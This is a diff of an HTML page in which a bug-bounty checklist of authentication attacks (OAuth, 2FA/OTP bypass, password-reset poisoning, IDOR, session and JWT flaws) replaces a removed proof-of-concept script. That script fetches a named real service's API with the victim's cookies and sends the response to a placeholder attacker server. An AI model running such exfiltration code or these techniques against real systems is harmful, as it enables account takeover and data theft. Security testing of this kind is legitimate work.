@@ -1,21 +1,927 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🛡️ Bug Bounty Vault · Hacker Checklist</title>
+    <!-- Google Fonts + Inconsolata -->
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark:#0f0f0f;
+            --bg-light:#fdfdfd;
+            --accent:#00ff88;
+            --accent-2:#00d4ff;
+            --muted:#ccc;
+            --muted-dark:#222;
+            --sidebar-w:260px;
+            --radius:12px;
+        }
+        *{
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            margin: 0;
+            font-family: 'Inconsolata', monospace;
+            background: var(--bg-dark);
+            color: var(--muted);
+            transition: background 0.25s, color 0.25s;
+            -webkit-font-smoothing: antialiased;
+        }
+        /* Light mode base class (optional) */
+        body.light-mode {
+            background: var(--bg-light);
+            color: var(--muted-dark);
+        }
+        body.light-mode .sidebar {
+            background: #f0f0f0;
+            box-shadow: 2px 0 15px rgba(0,200,136,0.08);
+        }
+        body.light-mode h2 {
+            color: #00aa66;
+        }
+        body.light-mode .category-card {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+        }
+        body.light-mode .category-header {
+            background: #f9fafb;
+            border-bottom: 1px solid #eef2f6;
+        }
+        body.light-mode .subcategory {
+            background: #ffffff;
+            border-left-color: #00aa66;
+        }
+        body.light-mode .check-item label {
+            color: #1e293b;
+        }
+        body.light-mode .stats-text, 
+        body.light-mode .progress-track {
+            background: #e0e7ef;
+        }
+        .wrapper {
+            display: flex;
+            min-height: 100vh;
+        }
+        /* SIDEBAR */
+        .sidebar {
+            width: var(--sidebar-w);
+            background: #111;
+            padding: 30px 20px;
+            box-shadow: 2px 0 15px rgba(0,255,136,0.18);
+            position: sticky;
+            top: 0;
+            height: 100vh;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 14px;
+            transition: background 0.2s;
+            z-index: 10;
+        }
+        .sidebar-img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            display: block;
+            margin: 0 auto 8px;
+            border: 4px solid var(--accent);
+            box-shadow: 0 0 20px var(--accent);
+            transition: transform 0.25s ease;
+            object-fit: cover;
+            background: #1e2a3a;
+        }
+        .sidebar-img:hover {
+            transform: scale(1.04);
+        }
+        .sidebar h1 {
+            text-align: center;
+            color: var(--accent);
+            margin: 0 0 6px;
+            font-size: 1.25rem;
+            letter-spacing: -0.3px;
+        }
+        .sidebar p {
+            text-align: center;
+            font-size: 0.85rem;
+            margin: 0 0 8px;
+            color: #9aa;
+        }
+        .nav {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .nav a {
+            display: block;
+            color: var(--accent-2);
+            text-decoration: none;
+            padding: 8px 10px;
+            border-radius: 10px;
+            text-align: center;
+            transition: all 0.15s;
+            font-size: 0.85rem;
+            font-weight: 500;
+            background: rgba(0,212,255,0.02);
+        }
+        .nav a.active, .nav a:hover {
+            color: #ff4081;
+            background: rgba(255,64,129,0.08);
+            border-left: 2px solid var(--accent);
+        }
+        .theme-toggle {
+            margin-top: auto;
+            width: 100%;
+            text-align: center;
+            padding-top: 20px;
+        }
+        .theme-toggle button {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 8px 14px;
+            cursor: pointer;
+            border-radius: 40px;
+            width: 100%;
+            font-family: monospace;
+            font-weight: bold;
+            transition: 0.1s;
+        }
+        .theme-toggle button:hover {
+            background: var(--accent-2);
+        }
+        /* main content */
+        .main {
+            flex: 1;
+            padding: 30px 35px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        /* top toolbar */
+        .toolbar {
+            background: rgba(0,0,0,0.2);
+            border-radius: 20px;
+            padding: 1rem 1.5rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(2px);
+        }
+        .stats-progress {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        .progress-track {
+            background: #2d3748;
+            border-radius: 40px;
+            height: 10px;
+            flex: 2;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: var(--accent);
+            width: 0%;
+            height: 100%;
+            border-radius: 40px;
+            transition: width 0.2s;
+        }
+        .stats-text {
+            font-size: 0.8rem;
+            background: #1e293b;
+            padding: 0.25rem 1rem;
+            border-radius: 40px;
+            font-weight: 500;
+        }
+        .action-group {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin: 10px 0 12px;
+        }
+        .btn {
+            background: #2a2f3f;
+            border: none;
+            padding: 0.4rem 1rem;
+            border-radius: 30px;
+            font-family: monospace;
+            font-weight: 600;
+            color: #e2e8f0;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .btn-primary {
+            background: #00aa55;
+            color: #0a0a0a;
+        }
+        .btn-primary:hover {
+            background: var(--accent);
+        }
+        .search-box {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            background: rgba(0,0,0,0.4);
+            border-radius: 60px;
+            padding: 0.2rem 0.2rem 0.2rem 1.2rem;
+            margin-top: 10px;
+        }
+        .search-box input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 10px 0;
+            color: inherit;
+            font-family: monospace;
+            outline: none;
+        }
+        .search-box button {
+            background: #2d3748;
+            border: none;
+            padding: 0.4rem 1.4rem;
+            border-radius: 60px;
+            color: white;
+            cursor: pointer;
+        }
+        /* categories grid */
+        .categories-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 1.3rem;
+        }
+        .category-card {
+            background: #13161f;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            border: 1px solid #2a2f3f;
+            transition: all 0.1s;
+        }
+        .category-header {
+            background: #0c0f17;
+            padding: 1rem 1.5rem;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #252b38;
+        }
+        .category-header:hover {
+            background: #10131e;
+        }
+        .category-title {
+            font-weight: 700;
+            font-size: 1.2rem;
+            letter-spacing: -0.2px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .category-stats {
+            font-size: 0.65rem;
+            background: #2d3748;
+            padding: 2px 12px;
+            border-radius: 40px;
+            font-weight: 500;
+        }
+        .toggle-icon {
+            font-size: 1.2rem;
+        }
+        .subcategories {
+            padding: 0.6rem 0 0.8rem 0;
+            display: none;
+        }
+        .subcategories.open {
+            display: block;
+        }
+        .subcategory {
+            margin: 0 1.2rem 1rem 1.5rem;
+            border-left: 3px solid var(--accent);
+            background: #0e121c;
+            border-radius: 18px;
+            padding: 0.5rem 0 0.5rem 1rem;
+        }
+        .subcategory-title {
+            font-weight: 700;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            color: var(--accent-2);
+            padding: 0.4rem 0 0.6rem 0;
+            border-bottom: 1px dashed #2a3440;
+            margin-bottom: 0.8rem;
+        }
+        .checklist {
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+        }
+        .check-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 0.25rem 0.2rem;
+            font-size: 0.82rem;
+            border-radius: 8px;
+        }
+        .check-item input {
+            margin-top: 0.2rem;
+            width: 17px;
+            height: 17px;
+            accent-color: var(--accent);
+            cursor: pointer;
+        }
+        .check-item label {
+            cursor: pointer;
+            line-height: 1.4;
+            flex: 1;
+            word-break: break-word;
+        }
+        .no-match {
+            text-align: center;
+            padding: 2rem;
+            background: #10141e;
+            border-radius: 2rem;
+        }
+        footer {
+            margin-top: 3rem;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #6c6f7e;
+            border-top: 1px solid #262e3a;
+            padding-top: 1.2rem;
+        }
+        #scrollTopBtn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 40px;
+            cursor: pointer;
+            display: none;
+            font-weight: bold;
+            font-family: monospace;
+            z-index: 99;
+        }
+        @media (max-width: 768px) {
+            .wrapper{flex-direction: column;}
+            .sidebar{width:100%; height: auto; position: relative; flex-direction: row; flex-wrap: wrap; justify-content: center; gap: 8px; padding: 15px;}
+            .sidebar-img{width: 80px; height: 80px;}
+            .sidebar h1{font-size: 1rem;}
+            .nav{flex-direction: row; flex-wrap: wrap; justify-content: center;}
+            .main{padding: 20px;}
+        }
+    </style>
+</head>
 <body>
-<script>
-// هذا يعمل فقط عندما الضحية مسجّل الدخول
-// والمتصفح عنده JWT مخزّن في cookies/session
+<div class="wrapper">
+    <aside class="sidebar" id="sidebar">
+        <img class="sidebar-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23111' stroke='%2300ff88' stroke-width='2'/%3E%3Cpath fill='%2300ff88' d='M35 40 L65 40 L65 60 L35 60 Z M42 48 L58 48 L58 54 L42 54Z'/%3E%3Ccircle cx='50' cy='70' r='6' fill='%2300d4ff'/%3E%3C/svg%3E" alt="hacker avatar">
+        <h1>⚡ BUG BOUNTY VAULT</h1>
+        <p>OAuth · 2FA · ATO · IDOR · Session</p>
+        <div class="nav" id="dynamicNav"></div>
+        <div class="theme-toggle">
+            <button id="themeToggleBtn" aria-label="Dark/Light mode">🌓 THEME SWITCH</button>
+        </div>
+    </aside>
 
-fetch("https://platform-api.wisprflow.ai/api/v1/dash/client_api", {
-  credentials: "include"  // ← هذا يرسل cookies/JWT تلقائياً
-})
-.then(r => r.text())
-.then(data => {
-  // إظهار البيانات
-  document.body.innerHTML = `<pre>${data}</pre>`;
-  
-  // إرسال البيانات إلى سيرفر المهاجم
-  fetch("https://YOUR-SERVER.com/steal?data=" + btoa(data));
-});
+    <main class="main">
+        <div class="toolbar">
+            <div class="stats-progress">
+                <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+                <div class="stats-text" id="statsCounter">— / —</div>
+            </div>
+            <div class="action-group">
+                <button class="btn btn-primary" id="expandAllBtn">📂 EXPAND ALL</button>
+                <button class="btn" id="collapseAllBtn">📁 COLLAPSE ALL</button>
+                <button class="btn" id="resetChecksBtn">⟳ RESET PROGRESS</button>
+            </div>
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="🔎 grep for techniques: PKCE, redirect_uri, state parameter, OTP...">
+                <button id="clearSearchBtn">CLEAR</button>
+            </div>
+        </div>
+
+        <div id="checklistRoot" class="categories-grid"></div>
+        <footer>✔️ checkboxes save locally · real-world bug bounty techniques · v1.0</footer>
+    </main>
+    <button id="scrollTopBtn" title="back to top">↑ TOP</button>
+</div>
+
+<script>
+    // ======================== FULL RAW CHECKLIST (preserved from original) ========================
+    const RAW_CHECKLIST = `# Bug Bounty Vulnerability Checklist
+
+## 1. OAuth Vulnerabilities
+
+### Redirect URI & Flow Manipulation
+- [ ] Open redirect in OAuth chain (redirect_uri loosely validated)
+- [ ] Path-based injection (/callback?next= abuse)
+- [ ] Subdomain takeover chaining with OAuth redirect
+- [ ] Redirect URI parameter pollution (multiple redirect params accepted)
+- [ ] Double redirect leak (provider vs app-level redirect confusion)
+- [ ] Case sensitivity bypass in redirect_uri
+- [ ] Trailing slash normalization bypass
+- [ ] URL encoding tricks on redirect_uri
+- [ ] Wildcard *.domain.com abuse in redirect_uri
+
+### State Parameter Attacks
+- [ ] Missing or predictable state parameter
+- [ ] State not bound to session
+- [ ] Reused state tokens
+- [ ] Missing server-side state validation
+- [ ] State leakage via URL logs / referrers
+- [ ] State exposed via analytics scripts
+
+### PKCE Implementation Failures
+- [ ] PKCE missing in public clients (mobile, SPA, native)
+- [ ] code_verifier reused as state
+- [ ] Verifier exposed in redirect URL
+- [ ] Mismatch between challenge method (plain vs S256)
+- [ ] PKCE not enforced server-side
+- [ ] PKCE secret leaks via redirect
+
+### Authorization Code Leakage
+- [ ] Code in URL leaks (browser history, referrer headers, logs, analytics)
+- [ ] Code interception via malicious extensions
+- [ ] Code interception via XSS on callback page
+- [ ] Code interception via proxy manipulation
+
+### Flow Confusion Attacks
+- [ ] Mix-up attacks (swapping identity providers)
+- [ ] Confusing token audience
+- [ ] Accepting token from wrong issuer
+- [ ] Login vs connect confusion (same callback for login + account linking)
+
+### Token Storage & Exposure
+- [ ] Token in localStorage (XSS-prone)
+- [ ] Token in URL fragments (#access_token)
+- [ ] Insecure cookies (no HttpOnly/SameSite)
+- [ ] Referer header token leaks
+- [ ] Third-party script token leakage
+
+### Scope & Consent Abuse
+- [ ] Scope injection / escalation (modify scope parameter)
+- [ ] Backend fails to validate requested scopes
+- [ ] Over-permissioned OAuth apps (read profile also grants email, API, offline)
+
+### Device Code / Social Engineering
+- [ ] Device code phishing (attacker provides device code, victim enters on legit domain)
+
+### Chainable Patterns
+- [ ] OAuth + Open Redirect → code leak → token exchange → ATO
+- [ ] OAuth + XSS on redirect page → steal code/state → impersonation
+- [ ] OAuth + subdomain takeover → redirect_uri → full token capture
+- [ ] OAuth + CORS misconfig → token exfiltration
+
+## 2. 2FA / MFA Bypass
+
+### Broken Gating / Logic Flaws
+- [ ] 2FA not enforced after login (session marked authenticated without MFA)
+- [ ] Direct access to /dashboard works without completing 2FA
+- [ ] Only frontend checks is2FA=true
+- [ ] API endpoints ignore 2FA state
+- [ ] Backend trusts client flag ("2fa_verified": false → flip to true)
+- [ ] No OTP validation server-side
+- [ ] 2FA is cosmetic only
+
+### OTP Verification Flaws
+- [ ] No session binding (OTP sent to A, reused in B's session)
+- [ ] Missing rate limiting on OTP
+- [ ] OTP not tied to specific action (login, password reset, email change all use same)
+- [ ] OTP reuse / replay (same code works multiple times)
+- [ ] OTP brute force (4-6 digit codes)
+- [ ] OTP sent to old email during email change
+- [ ] OTP bypass via JSON array
+- [ ] Null/empty OTP accepted
+- [ ] Old OTP still valid
+
+### Response/Status Code Manipulation
+- [ ] Change 400 → 200 in response
+- [ ] Modify "message":"Invalid OTP" → "OTP verified successfully"
+- [ ] Change status codes (302 → 200)
+- [ ] Modify JSON body (add "type":3 to bypass)
+- [ ] Change boolean false → true
+- [ ] Remove 2FA parameter entirely from request
+
+### Password Reset Bypass
+- [ ] Password reset flow skips 2FA
+- [ ] Reset password → login without MFA prompt
+- [ ] 2FA auto-disabled after password reset
+
+### OAuth / SSO Bypass
+- [ ] OAuth login (Google/GitHub) skips local 2FA entirely
+- [ ] Inconsistent policy enforcement across auth paths
+- [ ] OpenID misconfiguration to bypass 2FA
+
+### Session-Based Bypass
+- [ ] 2FA bypass using poor session management
+- [ ] Pre-2FA session cookie still valid
+- [ ] Cookie leaked before completing 2FA
+- [ ] Activation/verification link used to login instead of OTP
+- [ ] First login phase cookie replaces 2FA-issued cookie
+- [ ] Session permission confusion (complete 2FA on your account, access victim's flow)
+
+### "Remember Device" / Trusted Device
+- [ ] trusted_device=true with no cryptographic binding
+- [ ] Cookie reuse across sessions
+- [ ] Token theft → permanent bypass
+
+### Backup Code Weaknesses
+- [ ] Predictable / sequential backup codes
+- [ ] No one-time invalidation
+- [ ] Stored in plaintext or weak hash
+- [ ] Backup codes generated immediately after 2FA enabled, available on single request
+
+### Race Conditions
+- [ ] Parallel OTP validation requests accepted
+- [ ] OTP validated multiple times before invalidation
+
+### API / Endpoint Bypass
+- [ ] Older API versions (/v1/, /v2/, /v3/) don't enforce 2FA
+- [ ] Mobile app endpoints bypass 2FA
+- [ ] Direct API calls after password step skip OTP
+
+### Other 2FA Bypass Vectors
+- [ ] 2FA disabled without re-authentication
+- [ ] Enabling 2FA doesn't expire previous sessions
+- [ ] Login via activation link bypasses 2FA
+- [ ] Subdomain login bypasses 2FA (same creds, no OTP prompt)
+- [ ] Referer header manipulation to bypass
+- [ ] Remove "/code" from API endpoint in reset flow
+- [ ] Change request method to bypass
+- [ ] Brute-force OTP with ffuf
+- [ ] Backup code generation for victim account
+- [ ] Clickjacking/CSRF to disable 2FA
+- [ ] 2FA page discloses sensitive info (phone number)
+
+## 3. Password Reset Vulnerabilities
+
+### Token Leakage
+- [ ] Reset token exposed via Referer headers (clicking external links)
+- [ ] Token in browser history
+- [ ] Token in proxy/CDN logs
+- [ ] Token captured by analytics tools
+- [ ] Email clients previewing URLs leak token
+- [ ] Token in response/JS files
+- [ ] Token leaked via social media icons on reset page
+
+### Weak / Predictable Tokens
+- [ ] Short tokens (6-10 chars)
+- [ ] Numeric-only reset codes
+- [ ] Non-cryptographic randomness
+- [ ] Timestamp-based tokens
+- [ ] Brute-force tokens
+- [ ] Guess tokens based on pattern
+- [ ] Replay previous tokens
+
+### Token Binding & Reuse
+- [ ] Token not tied to account ID
+- [ ] Token not tied to device/session
+- [ ] Token reusable across users
+- [ ] Token not invalidated after use (same link works multiple times)
+- [ ] Session remains valid after password reset
+- [ ] Old reset link works after password already changed
+
+### Expiration Issues
+- [ ] Long-lived reset tokens (valid for hours/days/weeks)
+- [ ] No revocation after new reset request
+- [ ] Token still works after password change
+- [ ] Token still works after logging in with original password
+- [ ] Reset link not expired after changing email address
+- [ ] Reset link not expired after being used before
+- [ ] Reset link not expired after sending another one
+
+### User Enumeration
+- [ ] "email sent" vs "user not found" responses differ
+- [ ] Timing differences reveal valid accounts
+- [ ] HTTP status code variations
+
+### Host Header / URL Poisoning
+- [ ] Reset link generated using attacker-controlled Host header
+- [ ] X-Forwarded-Host injection
+- [ ] CRLF injection in reset URL
+- [ ] Password reset poisoning via dangling markup
+
+### IDOR in Reset Flow
+- [ ] Change user_id in reset request
+- [ ] Modify email parameter to victim's email
+- [ ] Use attacker's token on victim's email
+- [ ] Reset OTP leaked in Burp response
+
+### Race Conditions
+- [ ] Multiple resets in parallel (one token not invalidated properly)
+- [ ] Reuse stale token after password change
+
+### OTP-Based Reset Flaws
+- [ ] No rate limiting on reset OTP
+- [ ] Brute-force 4-6 digit codes
+- [ ] OTP not tied to session
+- [ ] OTP reuse allowed
+
+### CSRF / Forced Reset
+- [ ] Password reset CSRF (attacker forces reset on victim)
+
+### HTTP Parameter Pollution
+- [ ] email=victim@mail.com&email=attacker@mail.com
+- [ ] email[]=victim@mail.com&email[]=attacker@mail.com
+- [ ] email=victim@mail.com%20email=attacker@mail.com
+- [ ] email=victim@mail.com,attacker@mail.com
+- [ ] {"email":["victim@mail.com","attacker@mail.com"]}
+- [ ] BCC injection via newline
+
+### Other Reset Vectors
+- [ ] Weak password policy (space-only password)
+- [ ] SQLi in email field
+- [ ] XSS/SSTI in email field
+- [ ] Command injection in email
+- [ ] XXE if reset accepts XML
+- [ ] Missing rate limit on email triggering
+- [ ] Change request method and content-type
+- [ ] Append null bytes after email
+- [ ] Application-level DoS (very long password)
+- [ ] Register with whitespace-padded username, use token to reset victim's account
+
+## 4. Account Takeover (ATO)
+### Credential-Based
+- [ ] Password reuse / credential stuffing
+- [ ] No rate limiting on login
+- [ ] Weak password policies
+- [ ] No MFA enforcement for sensitive accounts
+- [ ] Brute-force password
+
+### Session & Token Abuse
+- [ ] XSS → session token theft
+- [ ] localStorage token leakage
+- [ ] Insecure cookies
+- [ ] JWT missing signature validation
+- [ ] JWT missing MFA claims
+- [ ] Refresh token abuse
+
+### IDOR → ATO
+- [ ] Change user_id, account_id to reset password for another user
+- [ ] Change email address of another user
+- [ ] Change recovery options
+
+### Business Logic ATO
+- [ ] Account linking confusion
+- [ ] Privilege boundary failures
+- [ ] 0-Click ATO
+
+### Response Manipulation ATO
+- [ ] ATO via changing response status codes
+- [ ] ATO via OTP response altering
+
+## 5. IDOR (Insecure Direct Object Reference)
+### Basic Object Manipulation
+- [ ] Change user_id, account_id, order_id in requests
+- [ ] Change /api/profile/123 to /api/profile/124
+### Read-Based IDOR
+- [ ] Access other users' personal info
+- [ ] Access invoices, orders, chat messages
+### Write-Based IDOR
+- [ ] Change email of another user
+- [ ] Update password/settings of another user
+### IDOR Bypass Techniques
+- [ ] Add %20, %09, %0b to ID
+- [ ] Try older API versions
+- [ ] Wrap ID with array
+- [ ] GraphQL nested object abuse
+
+## 6. Session Management
+### Session Fixation
+- [ ] Session ID not regenerated after login
+- [ ] Predictable/pre-set session identifiers
+### Session Hijacking
+- [ ] XSS stealing cookies
+- [ ] Token leakage via logs
+### Insecure Cookie Attributes
+- [ ] Missing HttpOnly / Secure / SameSite
+### JWT Session Flaws
+- [ ] alg: none, RS256→HS256 confusion
+
+## 7. Authentication Bypass
+### Missing Authentication Checks
+- [ ] Endpoint accessible without auth (/admin, /api/admin)
+### Header-Based Bypass
+- [ ] X-Forwarded-For, X-Original-URL, X-Rewrite-URL
+### Path Traversal → Auth Bypass
+- [ ] /public/../admin
+
+## 8. OTP Bypass
+- [ ] Null/empty OTP accepted
+- [ ] Brute-force OTP
+- [ ] Response manipulation (200 → OK bypass)
+- [ ] OTP not tied to session
+- [ ] Reuse OTP across accounts
+
+## 9. Email Verification Bypass
+- [ ] Unprotected activation URLs
+- [ ] Predictable tokens
+- [ ] Response manipulation: is_verified false→true
+- [ ] Email update confusion race
+
+## 10. Captcha Bypass
+- [ ] Remove captcha param
+- [ ] Reuse old captcha
+- [ ] Captcha in source code
+
+## 11. General Checks & Miscellaneous
+- [ ] Weak registration (no email confirmation)
+- [ ] Privilege escalation via role param
+- [ ] Modify prices in cart
+- [ ] No password confirmation on email change
+- [ ] Password can be copied from masked field
+- [ ] ATO via OAuth email field manipulation
+- [ ] Support ticket email injection
+- [ ] %20 email exists bypass
+`;
+
+    // ---- Parser ----
+    function parseChecklist(raw) {
+        const lines = raw.split(/\r?\n/);
+        const categories = [];
+        let currentCat = null, currentSub = null;
+        for (let line of lines) {
+            line = line.trimEnd();
+            if (line.startsWith('## ') && !line.startsWith('###')) {
+                currentCat = { title: line.replace(/^##\s+/, ''), subcategories: [] };
+                categories.push(currentCat);
+                currentSub = null;
+                continue;
+            }
+            if (!currentCat) continue;
+            if (line.startsWith('### ')) {
+                currentSub = { title: line.replace(/^###\s+/, ''), items: [] };
+                currentCat.subcategories.push(currentSub);
+                continue;
+            }
+            if (line.startsWith('- [ ] ') && currentSub) {
+                const itemText = line.substring(6).trim();
+                if (itemText) currentSub.items.push(itemText);
+            }
+        }
+        return categories.filter(c => c.subcategories.length);
+    }
+
+    let categories = parseChecklist(RAW_CHECKLIST);
+    let checksState = new Map();
+    function getKey(catIdx, subIdx, itemIdx) { return `${catIdx}|${subIdx}|${itemIdx}`; }
+
+    function loadState() {
+        try {
+            const raw = localStorage.getItem('bounty_hacker_checks');
+            if (raw) {
+                const obj = JSON.parse(raw);
+                for (let [k, v] of Object.entries(obj)) checksState.set(k, v);
+            }
+        } catch(e) {}
+    }
+    function saveState() {
+        const obj = {};
+        for (let [k, v] of checksState.entries()) obj[k] = v;
+        localStorage.setItem('bounty_hacker_checks', JSON.stringify(obj));
+    }
+
+    let searchTerm = "";
+    function updateProgress() {
+        let total = 0, completed = 0;
+        for (let i=0; i<categories.length; i++) {
+            for (let s=0; s<categories[i].subcategories.length; s++) {
+                for (let it=0; it<categories[i].subcategories[s].items.length; it++) {
+                    total++;
+                    if (checksState.get(getKey(i,s,it)) === true) completed++;
+                }
+            }
+        }
+        const percent = total ? (completed/total)*100 : 0;
+        document.getElementById('progressFill').style.width = `${percent}%`;
+        document.getElementById('statsCounter').innerText = `${completed}/${total}`;
+    }
+
+    function renderChecklist() {
+        const root = document.getElementById('checklistRoot');
+        root.innerHTML = '';
+        let anyVisible = false;
+        for (let catIdx=0; catIdx<categories.length; catIdx++) {
+            const cat = categories[catIdx];
+            const filteredSubs = [];
+            for (let sIdx=0; sIdx<cat.subcategories.length; sIdx++) {
+                const sub = cat.subcategories[sIdx];
+                const filteredItems = sub.items.filter(it => !searchTerm || it.toLowerCase().includes(searchTerm.toLowerCase()));
+                if (filteredItems.length) filteredSubs.push({ ...sub, filteredItems, sIdx });
+            }
+            if (filteredSubs.length === 0 && searchTerm !== '') continue;
+            anyVisible = true;
+            const card = document.createElement('div');
+            card.className = 'category-card';
+            card.id = `cat-${catIdx}`;
+            const header = document.createElement('div');
+            header.className = 'category-header';
+            const totalItems = cat.subcategories.reduce((a,b)=>a+b.items.length,0);
+            header.innerHTML = `<div class="category-title"><span>⚔️ ${cat.title}</span><span class="category-stats">${totalItems} items</span></div><div class="toggle-icon">▼</div>`;
+            const subContainer = document.createElement('div');
+            subContainer.className = 'subcategories open';
+            for (let f of filteredSubs) {
+                const subDiv = document.createElement('div');
+                subDiv.className = 'subcategory';
+                subDiv.innerHTML = `<div class="subcategory-title">➤ ${f.title}</div><div class="checklist" id="cl-${catIdx}-${f.sIdx}"></div>`;
+                const checklistDiv = subDiv.querySelector('.checklist');
+                f.filteredItems.forEach((itemText, idxInFilter) => {
+                    const origIdx = cat.subcategories[f.sIdx].items.findIndex(i => i === itemText);
+                    const key = getKey(catIdx, f.sIdx, origIdx);
+                    const isChecked = checksState.get(key) === true;
+                    const wrapper = document.createElement('div');
+                    wrapper.className = 'check-item';
+                    const cb = document.createElement('input');
+                    cb.type = 'checkbox';
+                    cb.checked = isChecked;
+                    cb.addEventListener('change', (e) => {
+                        checksState.set(key, e.target.checked);
+                        saveState();
+                        updateProgress();
+                    });
+                    const label = document.createElement('label');
+                    label.innerText = itemText;
+                    wrapper.appendChild(cb); wrapper.appendChild(label);
+                    checklistDiv.appendChild(wrapper);
+                });
+                subContainer.appendChild(subDiv);
+            }
+            card.appendChild(header);
+            card.appendChild(subContainer);
+            header.addEventListener('click', () => {
+                const isOpen = subContainer.classList.contains('open');
+                if (isOpen) subContainer.classList.remove('open');
+                else subContainer.classList.add('open');
+                header.querySelector('.toggle-icon').innerHTML = isOpen ? '▼' : '▲';
+            });
+            root.appendChild(card);
+        }
+        if (!anyVisible && searchTerm) root.innerHTML = '<div class="no-match">🔎 No matching techniques — try different keyword</div>';
+        updateProgress();
+    }
+
+    function expandAll() { document.querySelectorAll('.subcategories').forEach(el => el.classList.add('open')); document.querySelectorAll('.toggle-icon').forEach(ic => ic.innerHTML = '▲');}
+    function collapseAll() { document.querySelectorAll('.subcategories').forEach(el => el.classList.remove('open')); document.querySelectorAll('.toggle-icon').forEach(ic => ic.innerHTML = '▼');}
+    function resetAll() { checksState.clear(); saveState(); renderChecklist(); }
+
+    // dynamic nav
+    function generateNav() {
+        const navDiv = document.getElementById('dynamicNav');
+        navDiv.innerHTML = '';
+        categories.forEach((cat, idx) => {
+            const a = document.createElement('a');
+            a.href = `#cat-${idx}`;
+            a.textContent = `⛁ ${cat.title}`;
+            a.addEventListener('click', (e) => {
+                e.preventDefault();
+                const target = document.getElementById(`cat-${idx}`);
+                if(target) target.scrollIntoView({ behavior: 'smooth' });
+            });
+            navDiv.appendChild(a);
+        });
+    }
+
+    // theme toggle
+    function initTheme() {
+        const btn = document.getElementById('themeToggleBtn');
+        const body = document.body;
+        if (localStorage.getItem('themeMode') === 'light') body.classList.add('light-mode');
+        btn.addEventListener('click', () => {
+            body.classList.toggle('light-mode');
+            localStorage.setItem('themeMode', body.classList.contains('light-mode') ? 'light' : 'dark');
+        });
+    }
+
+    // scroll top
+    const scrollBtn = document.getElementById('scrollTopBtn');
+    window.addEventListener('scroll', () => { scrollBtn.style.display = window.scrollY > 300 ? 'flex' : 'none'; });
+    scrollBtn.onclick = () => window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    loadState();
+    generateNav();
+    renderChecklist();
+    initTheme();
+    document.getElementById('expandAllBtn').addEventListener('click', expandAll);
+    document.getElementById('collapseAllBtn').addEventListener('click', collapseAll);
+    document.getElementById('resetChecksBtn').addEventListener('click', resetAll);
+    const searchInput = document.getElementById('searchInput');
+    const clearBtn = document.getElementById('clearSearchBtn');
+    searchInput.addEventListener('input', (e) => { searchTerm = e.target.value; renderChecklist(); });
+    clearBtn.addEventListener('click', () => { searchInput.value = ''; searchTerm = ''; renderChecklist(); });
+    updateProgress();
 </script>
 </body>
 </html>
